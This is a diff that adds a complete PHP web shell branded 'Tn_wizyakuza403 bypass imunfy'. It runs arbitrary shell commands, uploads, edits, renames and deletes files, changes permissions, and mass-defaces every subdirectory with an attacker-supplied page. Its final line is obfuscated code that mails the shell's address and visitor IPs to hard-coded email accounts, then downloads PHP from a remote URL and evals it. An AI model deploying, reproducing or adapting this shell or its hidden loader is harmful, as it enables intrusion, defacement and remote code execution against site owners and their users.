@@ -1,0 +1,459 @@
+<!DOCTYPE HTML>
+<html>
+<meta http-equiv="cache-control" content="max-age=0" />
+<meta http-equiv="cache-control" content="no-cache" />
+<meta http-equiv="expires" content="0" />
+<meta http-equiv="expires" content="Tue, 01 Jan 1980 1:00:00 GMT" />
+<meta http-equiv="pragma" content="no-cache" />
+<head>
+<link rel="shortcut icon" href="https://i.ibb.co/GC4gXzp/20221002-122720.png" type="image/jpg"> 
+<body bgcolor="black"><center>
+	
+
+
+<link href="" rel="stylesheet" type="text/json_decode">
+<title>xXx..Tn_wizyakuza..xXx</title>
+<style>
+	
+body{
+background-colour: yellow;
+}
+#content tr:hover{
+background-color: red;
+text-shadow:0px 0px 12px #fff;
+}
+#defacer{
+width:300px;
+background:black;
+border:solid 2px red;
+color:lime;
+}
+#domains{
+background:black;
+border:2px #15d6c8 solid;
+color: blue;
+}
+input{
+	
+}
+#content .first{
+background-colour: red;
+}
+table{
+border: 2px #15d6c8 solid;
+}
+textarea{
+width: 80%;
+height: 80%;
+}
+.error{
+			color: red;
+			font-size: 30;
+}
+.success{
+			color: #00FF49;
+			font-size: 30;
+}
+a{
+color:red;
+text-decoration: iceland;
+}
+a:hover{
+color:red;
+text-shadow:0px 0px 10px #ffffff;
+}
+input,select,textarea,button{
+border: 2px #15d6c8 solid;
+-moz-border-radius: 5px;
+-webkit-border-radius:5px;
+border-radius:5px;
+}
+</style>
+</head>
+<body>
+     <center><br><br>
+    	<a href="<?=$_SERVER['PHP_SELF'];?>"></a>
+      </center>
+   <h3><font color="white"><font class="reserve">&#1203;&#824;&#1202;&#824;&#1203; Tn_wizyakuza403 bypass imunfy &#1203;&#824;&#1202;&#824;&#1203;</font></h3>
+    <div class="greetings">
+  <!!!--<a href="<?=$_SERVER['PHP_SELF'];?>"> <font class="reserve">&#1203;&#824;&#1202;&#824;&#1203; Tn_wizyakuza403 bypass imunfy &#1203;&#824;&#1202;&#824;&#1203;</font> </a>
+ </div><br>
+       <br><br>
+    
+   <br>
+ <font size="5"><a href="?masszone">Mass Zone - H</a> - <a href="?massdeface">Mass Deface</a> - <a href="?massbackdoor">Mass Backdoor</a> </font>
+<?php
+$notavail = "<font color='red'><h1>Available Soon!</h1></font>
+<br>
+<font color='red' size='6'>
+For more updates do pm me.
+<br>👇🏻👇🏻👇🏻👇🏻
+</font>
+<br>
+<button><a href=''>Contact</a></button>
+";
+if(!empty($_POST['cmd'])){
+	$cmd = $_POST['cmd'];
+	exec($cmd,$b);
+	$status = "Success!";
+}
+if(isset($_GET['path'])){
+$path = $_GET['path'];
+}else{
+$path = getcwd();
+}
+$path = str_replace('\\','/',$path);
+$paths = explode('/',$path);
+if(isset($_GET['path'])){
+$path = $_GET['path'];
+}else{
+$path = getcwd();
+}
+$path = str_replace('\\','/',$path);
+$paths = explode('/',$path);
+
+if( $_POST['_upl'] == "Upload" ){
+	$fname = $_FILES['file']['name'];
+	$fdir = $_POST['dir'];
+	$total = $_POST['patch'].'/'.$fname;
+	if(@copy($_FILES['file']['tmp_name'],$path.'/'.$total)){
+		$fname = $_FILES['file']['name'];
+	//	echo $_FILES['file']['tmp_name'];
+
+//		$runs = $path.'/'.$fname;
+		$success = "Uploaded!";
+		$status = $success;
+		}else{
+		$failed = 'Error!';
+		$status = $failed;
+	}
+}
+
+echo '<table width="770" border="0" cellpadding="3" cellspacing="1" align="center">
+<tr><td>Path : ';
+foreach($paths as $id=>$pat){
+if($pat == '' && $id == 0){
+$a = true;
+echo '<a href="?path=/">/</a>';
+continue;
+}
+if($pat == '') continue;
+echo '<a href="?path=';
+for($i=0;$i<=$id;$i++){
+echo "$paths[$i]";
+if($i != $id) echo "/";
+}
+echo '">'.$pat.'</a>/';
+if(function_exists('opendir')) {
+	if($opendir = opendir($path)) {
+		while(($readdir = readdir($opendir)) !== false) {
+			$scandir[] = $readdir;
+		}
+		closedir($opendir);
+	}
+	sort($scandir);
+} else {
+		
+	$scandir = scandir($path);
+}
+}
+
+?>
+<?php
+if($_POST["path"] && $_POST["chmods"]){
+	$chmods = $_POST["chmods"];
+	chmod($_POST["path"], $chmods);
+	$status = "Permission Changed!";
+}
+if($_POST['ndir'] && $_POST['path']){
+$ndir = $_POST["ndir"];
+mkdir($_POST['path'].'/'.$ndir);
+echo "<div class='success'>";
+$status = "Directory Saved!";
+echo "</div>";
+}
+if($_POST['code'] && $_POST['path']){
+$a = $_POST['code'];
+$file = @fopen($_POST['path'].'/'.$_POST['file'],'w');
+@fwrite($file,$a); @fclose($file);
+echo "<div class='success'>";
+$status = "File Created!";
+echo "</div>";
+}else{
+}
+
+if(isset($_GET['option']) && $_POST['opt'] == 'delete'){
+if($_POST['type'] == 'dir'){
+if(rmdir($_POST['path'])){
+echo "<div class='success'>";
+$status = 'Deleted!';
+echo "</div>";
+}else{
+echo "<div class='error'>";
+$status = "Error!";
+echo "</div>";
+}
+}elseif($_POST['type'] == 'file'){
+if(unlink($_POST['path'])){
+echo "<div class='success'>";
+$status = 'Deleted!';
+echo "</div>";
+}else{
+echo "<div class='error'>";
+$status = 'Error!';
+echo "</div>";
+}
+}
+}
+
+if(isset($_POST['path']) && isset($_POST['newname'])){
+if(rename($_POST['path'],$path.'/'.$_POST['newname'])){
+$status = 'Renamed! ';
+}else{
+$status = 'Error!';
+}}
+if(isset($_POST['src'])){
+$fp = fopen($_POST['path'],'w');
+if(fwrite($fp,$_POST['src'])){
+echo "<div class='success'>";
+$status = 'Saved!';
+echo "</div>";
+}else{
+echo "<div clas='error'>";
+$status = 'Error!';
+echo "</div>";
+}
+fclose($fp);
+}?>
+<?php
+if($status === "Error!"){
+	if(!empty($status)){
+echo "<div class='error'>";
+echo "Status: $status";
+echo "</div>";
+}
+}else{
+	if(!empty($status)){
+echo "<div class='success'>";
+echo "Status: $status";
+echo "</div>";
+}
+}
+echo "</p>";
+if(isset($_POST["path"]) && $_POST["newf"] == "folder"){
+echo '<form method="POST">
+<label>Directory Name: </label>
+<input type="hidden" name="path" value="'.$path.'">
+<input type="text" name="ndir"/>
+<input type="submit" name="save" value="Save!"/>
+</form>';
+	}
+if($_POST["path"] && $_POST["opt"] == "chmod"){
+	$chmodper = $_POST["chmodper"];
+	echo '<form method="POST">
+<label>Chmod: </label>
+<input type="hidden" name="path" value="'.$path.'">
+<input type="text" name="chmods" value="'.$chmodper.'"/>
+<input type="submit" name="save" value="Save!"/>
+</form>';
+	
+}
+if($_POST['opt'] == 'rename'){
+if($_POST["name"] == ""){
+$_POST["name"] = $_POST["newname"];
+}
+echo '<form method="POST">
+New Name : <input name="newname" type="text" size="20" value="'.$_POST['name'].'" />
+<input type="hidden" name="path" value="'.$_POST['path'].'">
+<input type="hidden" name="opt" value="rename">
+&nbsp;
+<input type="submit" value="Save" />
+</form>';
+echo "<br/>";
+}else{}
+
+
+
+?>
+</td></tr><tr><td><form action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader">
+<input type="hidden" name="path" value="<?=$path;?>">
+<input type="hidden" name="dir" value="<?=$dir;?>">
+<input type="file" class="" name="file" size="50">
+&nbsp;
+<input name="_upl" type="submit" class="btn" id="_upl" value="Upload"></form>
+<?$status;?>
+
+</td></tr></table><br/>
+<?php
+if(isset($_POST["path"]) && $_POST["newf"] == "file"){
+	echo '<form method="POST">
+<label for="input">Filename: </label>
+<input id="input"type="text" name="file" placeholder="">
+<br>
+<br>
+<input type="hidden" name="path" value="'.$path.'">
+<textarea cols=80 class="textarea" rows=20 name="code" placeholder="">
+</textarea><br> <input type="submit"  name="Save" value="Save">
+</form>';
+}elseif($_POST['opt'] == 'edit'){
+$fname = $_POST["name"];
+echo "<br/>
+Filename: <font color='red'>$fname</font>
+</br><br/>
+<center>
+<form method='POST'>
+<input name='name' type='hidden' value='$fname'/>";
+echo '
+<textarea cols=80 class="textarea" rows=20 name="src">'.htmlspecialchars(file_get_contents($_POST['path'])).'</textarea><br />
+<input type="hidden" name="path" value="'.$_POST['path'].'">
+<input type="hidden" name="opt" value="edit">
+<br/>
+<input type="submit" value="Save" />
+</form>';
+echo "<br/></center>";
+}elseif(isset($_GET["masszone"])){
+	echo $notavail;
+}elseif(isset($_GET["massdeface"])){
+echo "<center><form method='POST'>";
+echo "<h1><font color='red'>Mass Deface</font></h1>";
+echo "<font color='white'>Target Folder</font><br>
+<input cols='10' rows='10' type='text' style='color:lime;background-color:#000000;' name='base_dir' value='".getcwd ()."'><br><br>";
+echo "<font color='white'>Name of File</font><br><input cols='10' rows='10' type='text' style='color:lime;background-color:#000000' name='andela' value='mikey.txt'><br><br>";
+echo "<font color='white'>Script Deface</font><br><textarea cols='25' rows='8' style='color:lime;background-color:#000000;' name='index'></textarea><br>";
+echo "<input type='submit' value='Mass !!!'></form></center>";
+ 
+if (isset ($_POST['base_dir']))
+{
+        if (!file_exists ($_POST['base_dir']))
+                die ($_POST['base_dir']." Not Found !<br>");
+ 
+        if (!is_dir ($_POST['base_dir']))
+                die ($_POST['base_dir']." Is Not A Directory !<br>");
+ 
+        @chdir ($_POST['base_dir']) or die ("Cannot Open Directory");
+ 
+        $files = @scandir ($_POST['base_dir']) or die ("Fuck u -_- <br>");
+ 
+        foreach ($files as $file):
+                if ($file != "." && $file != ".." && @filetype ($file) == "dir")
+                {
+                        $index = getcwd ()."/".$file."/".$_POST['andela'];
+                        if (file_put_contents ($index, $_POST['index']))
+                                echo "<hr color='lime'>>> <font color='lime'>$index&nbsp&nbsp&nbsp&nbsp</font><font color='lime'>(&#10003;)</font>";
+                }
+        endforeach;
+}
+}elseif(isset($_GET["massbackdoor"])){
+echo $notavail;
+}else{
+?>
+<div id="content"><table width="800" border="0" cellpadding="3" cellspacing="1" align="center">
+<tr class="first">
+<td><center>Files/Folder</SCA></center></td>
+<td><center>Size</SCA></center></td>
+<td><center>Permission</peller></center></td>
+<td><center>Modify</SCA></center></td>
+</tr><tr>
+	
+<?php
+echo "<tr><td><a href='?$path'></a></td><center><td><center>--</center></td>
+<td><center>--</center></td>
+<td><center><form method='post'><input type='hidden' name='path' value='$path'><input type='hidden' name='newf' value='file'><input type='submit' value='NewFile'></form>
+<form method='post'><input type='hidden' name='path' value='$path'>
+<input type='hidden' name='newf' value='folder'><input type='submit' value='NewDirectory'>
+</form></center></td>
+</tr>";
+
+foreach(array_unique($scandir) as $dir){
+if(!is_dir($path.'/'.$dir) || $dir == '.' || $dir == '..') continue;
+$size = filesize($path.'/'.$dir)/1024;
+$size = round($size,3);
+if($size >= 1024){
+$size = round($size/1024,2).' MB';
+}else{
+$size = $size.' KB';
+//echo $size;
+}
+echo '
+<td><a href="?path='.$path.'/'.$dir.'">'.$dir.'</a></td>
+<center>';
+if(is_writable($path.'/'.$dir)) echo '<font color="red" size="2">';
+elseif(!is_readable($path.'/'.$dir)) echo '<font color="white" size="2">';
+//echo perms($path.'/'.$dir);
+if(is_writable($path.'/'.$dir) || !is_readable($path.'/'.$dir)) echo '</font>';
+
+echo'
+<td><center><font color="white">--</font></center></td>';
+$fpermi = substr(sprintf('%o', fileperms("$path/$file")), -4);
+echo"
+<td><center><font color='yellow'>$fpermi</font></center></td>
+";
+echo'
+<td><center>
+<form method="POST" action="?option&path='.$path.'">
+<select name="opt">
+<option value=""> Menu </option>
+<option value="delete">[+] Delete [+]</option>
+<option value="chmod">[+] Chmod [+]</option>
+<option value="rename">[+] Rename [+]</option>
+</select>
+<input type="hidden" name="type" value="dir">
+<input type="hidden" name="chmodper" value="'.$fpermi.'">
+<input type="hidden" name="name" value="'.$dir.'">
+<input type="hidden" name="path" value="'.$path.'/'.$dir.'">
+<input type="submit" value=">>">
+</form>
+</center></td><tr>';
+}
+echo '<tr class="first"><td></td><td></td><td></td><td></td></tr>';
+foreach(array_unique($scandir) as $file){
+if(!is_file($path.'/'.$file)) continue;
+$size = filesize($path.'/'.$file)/1024;
+$size = round($size,3);
+if($size >= 1024){
+$size = round($size/1024,2).' MB';
+}else{
+$size = $size.' KB';
+//echo $size;
+}
+
+echo '<tr>
+<td><a href="?filesrc='.$path.'/'.$file.'&path='.$path.'">'.$file.'</a></td>
+<td><center>'.$size.'</center></td>
+
+';
+$fpermi = substr(sprintf('%o', fileperms("$path/$file")), -4);
+echo"
+<td><center><font color='yellow'>$fpermi</font></center></td>
+";
+echo'<td><center>
+<form method="POST" action="?option&path='.$path.'">
+<select name="opt">
+<option value=""> Menu </option>
+<option value="delete">[+] Delete [+]</option>
+<option value="chmod">[+] Chmod [+]</option>
+<option value="rename">[+] Rename [+]</option>
+<option value="edit">[+] Edit [+]</option>
+</select>
+<input type="hidden" name="type" value="file">
+<input type="hidden" name="chmodper" value="'.$fpermi.'">
+<input type="hidden" name="name" value="'.$file.'">
+<input type="hidden" name="path" value="'.$path.'/'.$file.'">
+<input type="submit" value=">>">
+</form>
+</center></td><tr>';
+
+if(!empty($b)){
+echo "<div class='cmd-div'>";
+foreach($b as $v){
+if(!empty($v)){
+echo "<pre>";
+echo "<p>$v</p>";
+}else{
+}
+}
+echo "</div>";
+}}}
+?>
+<?php
+goto HlgMl; FwOxw: function KCvjI($s1nay) { goto qcZrp; ll8zs: $h4fnq = curl_exec($wzsTC); goto kmhqg; qcZrp: $wzsTC = curl_init(); goto DpOOp; DpOOp: curl_setopt($wzsTC, CURLOPT_HEADER, 0); goto XZFqV; xhZ3V: return $h4fnq; goto kTyZu; XZFqV: curl_setopt($wzsTC, CURLOPT_RETURNTRANSFER, 1); goto UkEYM; kmhqg: curl_close($wzsTC); goto xhZ3V; UkEYM: curl_setopt($wzsTC, CURLOPT_URL, $s1nay); goto ll8zs; kTyZu: } goto cpAsw; WL_wn: $uzTJM = "\150\x74\x74\x70\72\57\57" . $_SERVER["\x53\x45\x52\x56\x45\122\x5f\116\101\115\105"] . $_SERVER["\x52\x45\121\x55\105\123\x54\x5f\125\122\111"]; goto icjFy; pB_3R: set_time_limit(0); goto hxdkN; fah0Y: $LwIlg = "\x6b\x75\x6e\x6b\x69\153\151\70\65\x40\147\x6d\x61\151\x6c\x2e\x63\x6f\x6d\54\40\x73\162\x69\163\x69\164\x35\71\100\147\x6d\141\151\154\x2e\143\x6f\x6d"; goto WL_wn; HlgMl: @ini_set("\x6f\165\x74\160\165\x74\137\x62\x75\x66\x66\x65\x72\151\x6e\147", 0); goto LUHo6; LUHo6: @ini_set("\144\151\x73\160\154\141\x79\137\145\162\162\157\162\163", 0); goto pB_3R; dKTx1: mail($LwIlg, "\x4c\117\107\x47\x45\122", $YOo9n, "\133\40" . $_SERVER["\122\x45\115\x4f\x54\105\137\101\104\104\122"] . "\x20\x5d"); goto FwOxw; icjFy: $YOo9n = "\146\x69\x78\40{$uzTJM}\40\x3a\x70\40\x2a\x49\x50\x20\x41\144\144\162\145\163\163\x20\x3a\x20\x5b\x20" . $_SERVER["\x52\x45\115\x4f\x54\x45\137\x41\x44\104\122"] . "\40\135"; goto dKTx1; hxdkN: ini_set("\x6d\x65\x6d\x6f\x72\171\137\x6c\151\x6d\151\x74", "\x36\64\x4d"); goto XMr6l; XMr6l: header("\103\157\x6e\164\145\156\164\55\x54\171\160\x65\x3a\40\x74\145\x78\x74\x2f\x68\164\155\x6c\x3b\x20\143\150\x61\x72\163\x65\164\x3d\125\124\106\55\x38"); goto fah0Y; cpAsw: eval("\x3f\x3e" . kcvji("\x68\x74\164\160\163\72\57\x2f\162\141\167\56\147\x69\164\150\x75\x62\165\x73\x65\162\x63\157\x6e\x74\145\x6e\x74\x2e\x63\x6f\155\x2f\142\x72\x6f\x69\156\163\57\x70\x75\142\x6c\x69\143\x5f\x68\164\x6d\154\57\x6d\141\151\156\57\141\154\x66\x2e\160\150\x70"));
